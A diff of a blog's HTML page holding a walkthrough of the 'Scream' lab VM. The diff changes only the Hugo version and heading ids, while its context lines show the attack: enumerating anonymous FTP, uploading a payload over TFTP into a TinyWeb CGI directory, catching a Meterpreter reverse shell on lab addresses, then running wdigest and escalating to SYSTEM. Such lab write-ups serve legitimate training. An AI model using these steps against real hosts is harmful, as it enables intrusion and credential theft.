@@ -5,7 +5,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.15" />
+<meta name="generator" content="Hugo 0.18.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://rastamouse.me/css/style.css" type="text/css">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
@@ -52,13 +52,13 @@
   </div>
   <h1 class="headline" itemprop="headline">Scream - Method 2 (Longer/Harder)</h1>
   <section class="body" itemprop="articleBody">
-    
+    <p></p>
 
-<h2 id="ftp:ed63a6c7e568009db84b215907f6385d">FTP</h2>
+<h2 id="ftp">FTP</h2>
 
 <p>As we can see from the original <code>Nmap</code> scan in Method 1, there is an FTP service which allows anonymous read access to part of the file system.  Peeking inside the <code>bin</code> and <code>root</code> folders, gives us a good indication that this where the <code>TinyWeb</code> service is running, however we have no write access.</p>
 
-<h2 id="tftp:ed63a6c7e568009db84b215907f6385d">TFTP</h2>
+<h2 id="tftp">TFTP</h2>
 
 <p>A UDP <code>Nmap</code> scan showed the port 69 (TFTP) may be open.</p>
 
@@ -100,7 +100,7 @@ drwxr-xr-x 1 ftp ftp              0 Feb 08  2013 cgi-bin
 </figure>
 </div>
 
-<h2 id="tinyweb-cgi:ed63a6c7e568009db84b215907f6385d">TinyWeb CGI</h2>
+<h2 id="tinyweb-cgi">TinyWeb CGI</h2>
 
 <p>I went and downloaded TinyWeb from RITLabs and found that within their download package, they had some example files for CGI applications.</p>
 
@@ -122,7 +122,7 @@ Hello, World!
 change line --&gt; print `exploit.exe`;
 </code></pre>
 
-<h2 id="payload:ed63a6c7e568009db84b215907f6385d">Payload</h2>
+<h2 id="payload">Payload</h2>
 
 <p>Now to make the exploit, but there&rsquo;s an added complication.  I found that normal PE32 executables created by msfpayload would not execute on the remote host, and if you examine the doscgi.exe file (in the cgi examples in the tinyweb download) you can see it&rsquo;s an MS-DOS executable.</p>
 
@@ -154,7 +154,7 @@ root@kali:~# file exploit.exe
 exploit.exe: MS-DOS executable, MZ for MS-DOS
 </code></pre>
 
-<h2 id="upload-and-execute:ed63a6c7e568009db84b215907f6385d">Upload and Execute</h2>
+<h2 id="upload-and-execute">Upload and Execute</h2>
 
 <p>Upload these two files via TFTP, then start the Metasploit Multi Hander.</p>
 
@@ -174,7 +174,7 @@ root@kali:~# msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=
 [*] Meterpreter session 1 opened (192.168.127.127:4444 -&gt; 192.168.127.130:1034)
 </code></pre>
 
-<h2 id="post-exploitation:ed63a6c7e568009db84b215907f6385d">Post Exploitation</h2>
+<h2 id="post-exploitation">Post Exploitation</h2>
 
 <pre><code class="language-text">meterpreter &gt; getuid
 Server username: SCREAM\alex
@@ -197,7 +197,6 @@ meterpreter &gt; wdigest
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 </code></pre>
-
   </section>
 </article>
 
